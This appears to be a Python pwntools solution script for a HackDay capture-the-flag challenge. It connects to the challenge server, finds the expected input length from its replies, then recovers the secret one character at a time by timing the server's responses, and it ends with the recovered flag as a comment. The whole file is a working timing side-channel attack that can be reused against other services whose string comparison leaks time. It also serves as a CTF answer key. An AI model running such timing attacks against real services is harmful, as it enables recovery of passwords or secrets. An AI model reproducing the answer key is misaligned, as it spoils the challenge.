from pwn import *
import string
import time

flag = ""
poss_chars = string.ascii_letters + string.punctuation + string.digits
conn = remote("challenges.hackday.fr", 48118)

correct_length = 1
while True:
    print(conn.recvuntil(b"? "))
    conn.sendline(f"{'a'*correct_length}".encode())
    ans = conn.recvline()
    print(ans)
    if "wrong length" not in ans.decode(errors="ignore"):
        break
    correct_length += 1

for i in range(correct_length, -1, -1):
    timings = []
    for c in poss_chars:
        print(conn.recvuntil(b"? "))
        conn.sendline(f"{flag + c + (' '*i)}".encode())
        start = time.time()
        ans = conn.recvline()
        timings.append(time.time() - start)
        print(ans)

    x = max(timings)
    print(x, timings.index(x), poss_chars[timings.index(x)])
    flag += poss_chars[timings.index(x)]
    print(f"{flag = }")

# HACKDAY{TIM3_t0_FlAg}